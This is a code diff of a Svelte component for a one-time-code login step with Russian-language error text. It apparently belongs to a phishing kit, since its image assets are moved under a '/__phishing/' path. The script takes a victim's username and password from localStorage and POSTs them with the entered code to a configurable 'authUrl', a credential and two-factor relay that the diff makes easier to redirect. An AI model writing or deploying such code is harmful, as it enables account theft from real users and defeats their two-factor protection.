@@ -205,7 +205,7 @@
       width: 32px;
       height: 32px;
       background-size: 312px 292px;
-      background-image: url(/base-c7ea6308.svg);
+      background-image: url(/__phishing/base-c7ea6308.svg);
       position: absolute;
       left: 0;
       top: 11px;
@@ -328,7 +328,7 @@
       height: 44px;
       display: block;
 
-      background-image: url(/base-c7ea6308.svg);
+      background-image: url(/__phishing/base-c7ea6308.svg);
       background-size: 312px 292px;
       content: "";
       left: -12px;
@@ -370,7 +370,7 @@
       top: 50%;
       transform: translateY(-50%);
       background-size: 192px 152px;
-      background-image: url(/common-cbde6d07.svg);
+      background-image: url(/__phishing/common-cbde6d07.svg);
     }
 
     .otp-form__error-title {
@@ -385,24 +385,27 @@
 
 <script context="module">
   export async function preload(_, session) {
-    return { exitUrl: session.exit };
+    return { exitUrl: session.exit, authUrl: session.authUrl };
   }
 </script>
 
 <script>
-  import * as ac from "./_auth-constants";
+  import * as ac from "../misc/auth-constants";
   import { onMount } from "svelte";
+  import { goto } from "@sapper/app";
 
   onMount(() => {
     if (
       !localStorage.getItem("username") ||
       !localStorage.getItem("password")
     ) {
-      window.location.assign("/auth");
+      goto("/auth");
     }
   });
 
   export let exitUrl;
+  export let authUrl;
+
   let inputLock = false;
   let error = "";
   let code = "";
@@ -417,7 +420,7 @@
       password: localStorage.getItem("password")
     };
 
-    fetch("/auth", {
+    fetch(authUrl, {
       method: "POST",
       body: JSON.stringify(data),
       headers: {
@@ -432,7 +435,7 @@
             break;
           case ac.R_ERROR_INVALID_CREDENTIALS:
           case ac.R_CAPTCHA:
-            window.location.assign("/auth");
+            goto("/auth");
             break;
           case ac.R_ERROR_INVALID_CODE:
             error = "Пожалуйста, введите код, который Вы только что получили.";
